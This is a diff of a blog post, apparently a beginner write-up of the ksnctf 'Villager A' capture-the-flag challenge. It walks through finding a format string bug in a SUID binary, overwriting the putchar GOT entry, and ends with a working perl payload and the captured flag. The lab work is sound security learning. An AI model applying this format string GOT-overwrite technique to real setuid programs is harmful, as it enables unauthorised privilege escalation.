@@ -7,7 +7,7 @@ title: ksnctf Villager A write-up
 [ksnctf](http://ksnctf.sweetduet.info) is one of the beginner level CTF websites. This article is the write-up for the question 4 [Villager A](http://ksnctf.sweetduet.info/problem/4), in which you need to exploit the *Format String Vulnerability* to capture the flag!  
 
 ## Write-up
-### __Connect__  
+### _Connect_  
 Using given information, access to the server `ssh -p 10022 q4@ctfq.sweetduet.info`  
 In the server, you can find
 ```
@@ -41,9 +41,9 @@ no
 I see. Good bye.
 ```
 
-### __Analyze__  
+### _Analyze_  
 Since I don't have an access to read flag.txt, it seems that I need to somehow exploit q4 (SUID=root) to read the file.  
-Let's disassemble.  
+Let's disassemble main().  
 
 ```
 ...
@@ -52,7 +52,7 @@ Let's disassemble.
 0x080485f0 <+60>:	call   0x80484b4 <printf@plt>		<==
 0x080485f5 <+65>:	lea    eax,[esp+0x18]
 0x080485f9 <+69>:	mov    DWORD PTR [esp],eax
-0x080485fc <+72>:	call   0x80484b4 <printf@plt>		<==
+0x080485fc <+72>:	call   0x80484b4 <printf@plt>		<== FMT_VULN
 0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
 0x08048608 <+84>:	call   0x8048474 <putchar@plt>		<==
 0x0804860d <+89>:	mov    DWORD PTR [esp+0x418],0x1
@@ -75,7 +75,7 @@ hello
 (gdb) x/s $esp+0x18
 0xbf9524d8:	 "hello\n"
 ```
-It seems that at \<main+48\>, `fgets()` is called to get a string from stdin; at \<main+72\>, `printf()` is called to output the string. But, it's kind of weird that `printf()` was called at \<main+60\> to output "Hi, ", and after that, `putchar()` was called to output "\n" (0xa). Why are they called separately, instead of calling just one like `printf("Hi, %s\n", input);` as you probably more familiar to write. Now, I'm getting suspicious that there is a format string vulnerability in this program.  
+It seems that at \<main+48\>, `fgets()` is called to get a string from stdin; at \<main+72\>, `printf()` is called to output the string. But, it's kind of weird that `printf()` was called at \<main+60\> to output "Hi, ", and after that, `putchar()` was called to output "\n" (0xa). Why are they called separately, instead of calling just one like `printf("Hi, %s\n", input);` as you probably more familiar to write. Now, I'm getting suspicious that there is a format string vulnerability in this program. (I mean, it's a CTF program)  
 What if I input some kind of *format string* at \<main+48\>?  
 
 ```
@@ -87,7 +87,7 @@ Hi, sirius400d604408
 Do you want the flag?
 ```
 
-It's now clear that there is a format string vulnerability in this program. So, let's think about how to exploit it to read flag.txt.  
+It's now clear that there is a format string vulnerability at _<main+72>_. So, let's think about how to exploit it to read flag.txt.  
   
 ```
 ...
@@ -148,10 +148,64 @@ Realize that 0x1 is moved into [esp+0x418] right before the jump to \<main+205\>
 ...
 ```
 
-On the other hand, if the jump was not taken, then it opens `flag.txt` and print it out.  
+On the other hand, if the jump was not taken, then it opens `flag.txt` and print it out (from \<main+212\> onwards)
 One possibility to attack this program is by using format string attack to change the value of [esp+0x418] to 0 before `jne` at \<main+219\>, but it wouldn't work because `mov [esp+0x418], 0x1` happens after the string vulnerability. Moreover, ASLR (Address Space Layout Randomization) is enabled on this system, so guessing the stack address of [esp+0x418] is very hard.  
   
 
-### __Exploitation__  
-Remember that ASLR doesn't disable the randomization of memory address of code section. If I can somehow set `eip` to \<main+221\> (0x08048691), I should be able to read `flag.txt`.
+### _Exploitation_  
+Remember that ASLR doesn't disable the randomization of memory address of code section. If I can somehow set `eip` to \<main+221\> (0x08048691), I should be able to read `flag.txt`.  
+Right after the format string vulnerability, `putchar@plt` is called, using PLT. That means, if I modify the address referred at `putchar@plt` to \<main+221\>, I can modify `eip`!  
+Let's examine. 
+```
+...
+0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
+=> 0x08048608 <+84>:	call   0x8048474 <putchar@plt>
+0x0804860d <+89>:	mov    DWORD PTR [esp+0x418],0x1
+0x08048618 <+100>:	jmp    0x8048681 <main+205>
+0x0804861a <+102>:	mov    DWORD PTR [esp],0x80487bb
+0x08048621 <+109>:	call   0x80484c4 <puts@plt>
+0x08048626 <+114>:	mov    eax,ds:0x8049a04
+0x0804862b <+119>:	mov    DWORD PTR [esp+0x8],eax
+0x0804862f <+123>:	mov    DWORD PTR [esp+0x4],0x400
+(gdb) stepi
+0x08048474 in putchar@plt ()
+(gdb) disassemble 
+Dump of assembler code for function putchar@plt:
+=> 0x08048474 <+0>:	jmp    DWORD PTR ds:0x80499e0
+0x0804847a <+6>:	push   0x8
+0x0804847f <+11>:	jmp    0x8048454
+End of assembler dump.
+```
 
+So, it seems that if I change the value stored at _0x80499e0_ to be _0x08048691_ (\<main+219\>), I can read flag.txt.  
+  
+
+```
+[q4@localhost ~]$ ./q4
+What's your name?
+AAAA%x.%x.%x.%x.%x.%x.%x.%x.
+Hi, AAAA400.cfa440.8.14.64dfc4.41414141.252e7825.78252e78.
+
+Do you want the flag?
+```
+As examining the format vulnerability, it seems that the input string is stored at _6th place_ from the top of the stack.  
+
+
+### _GETTING THE FLAG_
+Now, we got all the informatin needed.
+* modify the value at _0x80499e0_ to _0x8048691_  
+* offset is 6  
+
+Some calculation  
+```python
+>>> 0x8691 - 8
+34441
+>>>0x10804 - 0x8691
+33139
+```
+
+Thus, the exploit code is  
+```
+[q4@localhost ~]$ perl -e 'print "\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn"'| ./q4
+```
+Then, the flag was: _FLAG\_nwW6eP503Q3QI0zw_
